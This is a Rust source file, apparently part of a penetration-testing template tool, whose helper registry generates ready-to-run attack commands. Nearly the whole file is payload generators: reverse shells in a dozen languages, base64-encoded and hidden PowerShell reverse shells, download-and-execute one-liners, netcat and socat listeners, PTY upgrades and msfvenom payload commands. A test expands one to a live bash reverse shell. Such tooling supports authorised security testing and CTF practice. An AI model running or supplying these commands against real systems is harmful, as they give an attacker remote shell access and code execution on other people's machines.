//! `${fn:name(arg1, arg2, ...)}` invocations.
//!
//! Args are split on commas (after surrounding whitespace is trimmed). To embed a literal comma in
//! an arg, wrap it in single quotes: `${fn:foo('one,two', three)}`.
//!
//! Helpers are pure: they take `Vec<String>` and return `String`. No I/O.

use anyhow::{Result, anyhow, bail};
use base64::Engine;
use base64::engine::general_purpose::STANDARD as B64;
use std::collections::BTreeMap;

pub type HelperFn = fn(&[String]) -> Result<String>;

pub fn registry() -> BTreeMap<&'static str, HelperFn> {
    let mut m: BTreeMap<&'static str, HelperFn> = BTreeMap::new();

    // Reverse shells
    m.insert("bash_rev", bash_rev);
    m.insert("bash_rev_b64", bash_rev_b64);
    m.insert("sh_rev", sh_rev);
    m.insert("nc_rev", nc_rev);
    m.insert("nc_mkfifo", nc_mkfifo);
    m.insert("python_rev", python_rev);
    m.insert("python3_rev", python3_rev);
    m.insert("perl_rev", perl_rev);
    m.insert("php_rev", php_rev);
    m.insert("ruby_rev", ruby_rev);
    m.insert("socat_rev", socat_rev);
    m.insert("awk_rev", awk_rev);
    m.insert("lua_rev", lua_rev);

    // PowerShell
    m.insert("ps_rev", ps_rev);
    m.insert("ps_rev_b64", ps_rev_b64);
    m.insert("ps_iex_b64", ps_iex_b64);
    m.insert("ps_downloadstring", ps_downloadstring);

    // Listeners
    m.insert("nc_listener", nc_listener);
    m.insert("rlwrap_nc_listener", rlwrap_nc_listener);
    m.insert("ncat_ssl_listener", ncat_ssl_listener);
    m.insert("socat_listener", socat_listener);
    m.insert("python_http", python_http);

    // Shell upgrades
    m.insert("pty_upgrade_python3", pty_upgrade_python3);
    m.insert("pty_upgrade_python2", pty_upgrade_python2);
    m.insert("pty_upgrade_script", pty_upgrade_script);
    m.insert("stty_after_upgrade", stty_after_upgrade);

    // msfvenom
    m.insert("msfvenom_linux_x64_elf", msfvenom_linux_x64_elf);
    m.insert("msfvenom_windows_x64_exe", msfvenom_windows_x64_exe);
    m.insert("msfvenom_war", msfvenom_war);
    m.insert("msfvenom_php", msfvenom_php);
    m.insert("msfvenom_aspx", msfvenom_aspx);

    // Encoding utilities
    m.insert("b64", b64);
    m.insert("urlenc", urlenc);

    m
}

pub fn expand_helpers(text: &str) -> Result<String> {
    let reg = registry();
    let bytes = text.as_bytes();
    let mut out = String::with_capacity(text.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] as char == '$'
            && i + 4 < bytes.len()
            && &text[i..i + 4] == "${fn"
            && bytes[i + 4] as char == ':'
        {
            // find matching closing brace, respecting nested parens & quoted strings
            let inner_start = i + 5; // after `${fn:`
            let mut depth_paren = 0i32;
            let mut in_str = false;
            let mut j = inner_start;
            while j < bytes.len() {
                let c = bytes[j] as char;
                if in_str {
                    if c == '\'' {
                        in_str = false;
                    }
                } else {
                    match c {
                        '\'' => in_str = true,
                        '(' => depth_paren += 1,
                        ')' => depth_paren -= 1,
                        '}' if depth_paren == 0 => break,
                        _ => {}
                    }
                }
                j += 1;
            }
            if j >= bytes.len() {
                bail!("unterminated ${{fn:...}} starting at byte {}", i);
            }
            let inner = &text[inner_start..j];
            let (name, args) = parse_call(inner)?;
            let helper = reg
                .get(name.as_str())
                .ok_or_else(|| anyhow!("unknown helper '{}'", name))?;
            out.push_str(&helper(&args)?);
            i = j + 1;
            continue;
        }
        out.push(bytes[i] as char);
        i += 1;
    }
    Ok(out)
}

fn parse_call(inner: &str) -> Result<(String, Vec<String>)> {
    let lp = inner
        .find('(')
        .ok_or_else(|| anyhow!("helper call missing '(' in '{}'", inner))?;
    if !inner.ends_with(')') {
        bail!("helper call missing ')' in '{}'", inner);
    }
    let name = inner[..lp].trim().to_string();
    let body = &inner[lp + 1..inner.len() - 1];
    let args = split_args(body)?;
    Ok((name, args))
}

fn split_args(body: &str) -> Result<Vec<String>> {
    let mut out = Vec::new();
    let mut cur = String::new();
    let mut in_str = false;
    let mut depth_paren = 0i32;
    for c in body.chars() {
        if in_str {
            if c == '\'' {
                in_str = false;
            } else {
                cur.push(c);
            }
            continue;
        }
        match c {
            '\'' => in_str = true,
            '(' => {
                depth_paren += 1;
                cur.push(c);
            }
            ')' => {
                depth_paren -= 1;
                cur.push(c);
            }
            ',' if depth_paren == 0 => {
                out.push(cur.trim().to_string());
                cur.clear();
            }
            _ => cur.push(c),
        }
    }
    let trimmed = cur.trim();
    if !trimmed.is_empty() || !body.is_empty() {
        if !out.is_empty() || !trimmed.is_empty() {
            out.push(trimmed.to_string());
        }
    }
    Ok(out)
}

fn args2(args: &[String], name: &str) -> Result<(String, String)> {
    if args.len() != 2 {
        bail!("{} expected (lhost, lport), got {} args", name, args.len());
    }
    Ok((args[0].clone(), args[1].clone()))
}

fn arg_n<'a>(args: &'a [String], n: usize, name: &str) -> Result<&'a String> {
    args.get(n)
        .ok_or_else(|| anyhow!("{} missing arg #{}", name, n))
}

// ===== reverse shells =====

fn bash_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "bash_rev")?;
    Ok(format!("bash -c 'bash -i >& /dev/tcp/{}/{} 0>&1'", h, p))
}

fn bash_rev_b64(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "bash_rev_b64")?;
    let raw = format!("bash -i >& /dev/tcp/{}/{} 0>&1", h, p);
    let enc = B64.encode(raw.as_bytes());
    Ok(format!(
        "bash -c \"{{echo,{}}}|{{base64,-d}}|{{bash,-i}}\"",
        enc
    ))
}

fn sh_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "sh_rev")?;
    Ok(format!("sh -i >& /dev/tcp/{}/{} 0>&1", h, p))
}

fn nc_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "nc_rev")?;
    Ok(format!("nc -e /bin/sh {} {}", h, p))
}

fn nc_mkfifo(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "nc_mkfifo")?;
    Ok(format!(
        "rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc {} {} >/tmp/f",
        h, p
    ))
}

fn python_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "python_rev")?;
    Ok(format!(
        "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn(\"/bin/bash\")'",
        h = h,
        p = p
    ))
}

fn python3_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "python3_rev")?;
    Ok(format!(
        "python3 -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{h}\",{p}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        h = h,
        p = p
    ))
}

fn perl_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "perl_rev")?;
    Ok(format!(
        "perl -e 'use Socket;$i=\"{h}\";$p={p};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");}};'",
        h = h,
        p = p
    ))
}

fn php_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "php_rev")?;
    Ok(format!(
        "php -r '$sock=fsockopen(\"{h}\",{p});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        h = h,
        p = p
    ))
}

fn ruby_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "ruby_rev")?;
    Ok(format!(
        "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{h}\",\"{p}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){{|io|c.print io.read}}end'",
        h = h,
        p = p
    ))
}

fn socat_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "socat_rev")?;
    Ok(format!(
        "socat TCP:{}:{} EXEC:'bash -li',pty,stderr,setsid,sigint,sane",
        h, p
    ))
}

fn awk_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "awk_rev")?;
    Ok(format!(
        "awk 'BEGIN {{s = \"/inet/tcp/0/{h}/{p}\"; while(42) {{ do{{ printf \"shell>\" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != \"exit\") close(s); }}}}'",
        h = h,
        p = p
    ))
}

fn lua_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "lua_rev")?;
    Ok(format!(
        "lua -e 'local s=require(\"socket\");local t=assert(s.tcp());t:connect(\"{h}\",{p});while true do local r,x=t:receive();local f=assert(io.popen(r,\"r\"));local b=assert(f:read(\"*a\"));t:send(b);end;'",
        h = h,
        p = p
    ))
}

// ===== powershell =====

fn ps_rev(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "ps_rev")?;
    Ok(format!(
        "powershell -nop -c \"$client = New-Object System.Net.Sockets.TCPClient('{h}',{p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
        h = h,
        p = p
    ))
}

fn ps_rev_b64(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "ps_rev_b64")?;
    let inner = format!(
        "$client = New-Object System.Net.Sockets.TCPClient('{h}',{p});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()",
        h = h,
        p = p
    );
    let utf16le: Vec<u8> = inner.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
    let b64 = B64.encode(&utf16le);
    Ok(format!("powershell -nop -w hidden -enc {}", b64))
}

fn ps_iex_b64(args: &[String]) -> Result<String> {
    let url = arg_n(args, 0, "ps_iex_b64")?;
    let inner = format!("IEX(New-Object Net.WebClient).DownloadString('{}')", url);
    let utf16le: Vec<u8> = inner.encode_utf16().flat_map(|u| u.to_le_bytes()).collect();
    let b64 = B64.encode(&utf16le);
    Ok(format!("powershell -nop -w hidden -enc {}", b64))
}

fn ps_downloadstring(args: &[String]) -> Result<String> {
    let url = arg_n(args, 0, "ps_downloadstring")?;
    Ok(format!(
        "powershell -c \"IEX(New-Object Net.WebClient).DownloadString('{}')\"",
        url
    ))
}

// ===== listeners =====

fn nc_listener(args: &[String]) -> Result<String> {
    let p = arg_n(args, 0, "nc_listener")?;
    Ok(format!("nc -lvnp {}", p))
}

fn rlwrap_nc_listener(args: &[String]) -> Result<String> {
    let p = arg_n(args, 0, "rlwrap_nc_listener")?;
    Ok(format!("rlwrap -cAr nc -lvnp {}", p))
}

fn ncat_ssl_listener(args: &[String]) -> Result<String> {
    let p = arg_n(args, 0, "ncat_ssl_listener")?;
    Ok(format!("ncat --ssl -lvnp {}", p))
}

fn socat_listener(args: &[String]) -> Result<String> {
    let p = arg_n(args, 0, "socat_listener")?;
    Ok(format!(
        "socat -d -d TCP-LISTEN:{},reuseaddr,fork FILE:`tty`,raw,echo=0",
        p
    ))
}

fn python_http(args: &[String]) -> Result<String> {
    let p = arg_n(args, 0, "python_http")?;
    Ok(format!("python3 -m http.server {}", p))
}

// ===== pty upgrades =====

fn pty_upgrade_python3(_args: &[String]) -> Result<String> {
    Ok("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'".into())
}

fn pty_upgrade_python2(_args: &[String]) -> Result<String> {
    Ok("python -c 'import pty; pty.spawn(\"/bin/bash\")'".into())
}

fn pty_upgrade_script(_args: &[String]) -> Result<String> {
    Ok("script -qc /bin/bash /dev/null".into())
}

fn stty_after_upgrade(_args: &[String]) -> Result<String> {
    Ok("# Background the shell with Ctrl-Z, then on your local term:\nstty raw -echo; fg\n# (then in the remote shell) reset; export TERM=xterm-256color; export SHELL=bash; stty rows 50 cols 200".into())
}

// ===== msfvenom =====

fn msfvenom_linux_x64_elf(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "msfvenom_linux_x64_elf")?;
    Ok(format!(
        "msfvenom -p linux/x64/shell_reverse_tcp LHOST={} LPORT={} -f elf -o shell.elf",
        h, p
    ))
}

fn msfvenom_windows_x64_exe(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "msfvenom_windows_x64_exe")?;
    Ok(format!(
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -f exe -o shell.exe",
        h, p
    ))
}

fn msfvenom_war(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "msfvenom_war")?;
    Ok(format!(
        "msfvenom -p java/jsp_shell_reverse_tcp LHOST={} LPORT={} -f war -o shell.war",
        h, p
    ))
}

fn msfvenom_php(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "msfvenom_php")?;
    Ok(format!(
        "msfvenom -p php/reverse_php LHOST={} LPORT={} -f raw -o shell.php",
        h, p
    ))
}

fn msfvenom_aspx(args: &[String]) -> Result<String> {
    let (h, p) = args2(args, "msfvenom_aspx")?;
    Ok(format!(
        "msfvenom -p windows/x64/shell_reverse_tcp LHOST={} LPORT={} -f aspx -o shell.aspx",
        h, p
    ))
}

// ===== encoding =====

fn b64(args: &[String]) -> Result<String> {
    let raw = arg_n(args, 0, "b64")?;
    Ok(B64.encode(raw.as_bytes()))
}

fn urlenc(args: &[String]) -> Result<String> {
    let raw = arg_n(args, 0, "urlenc")?;
    Ok(percent_encode(raw))
}

fn percent_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len());
    for b in s.bytes() {
        match b {
            b'A'..=b'Z' | b'a'..=b'z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(b as char);
            }
            other => {
                out.push('%');
                out.push_str(&format!("{:02X}", other));
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn bash_rev_works() {
        let r = expand_helpers("listener: ${fn:bash_rev(10.10.14.5, 4444)}").unwrap();
        assert_eq!(
            r,
            "listener: bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'"
        );
    }

    #[test]
    fn quoted_args_work() {
        let r = expand_helpers("x ${fn:b64('hello, world')}").unwrap();
        assert!(r.starts_with("x "));
        assert!(r.ends_with("aGVsbG8sIHdvcmxk"));
    }

    #[test]
    fn unknown_helper_errors() {
        assert!(expand_helpers("${fn:no_such(a)}").is_err());
    }
}
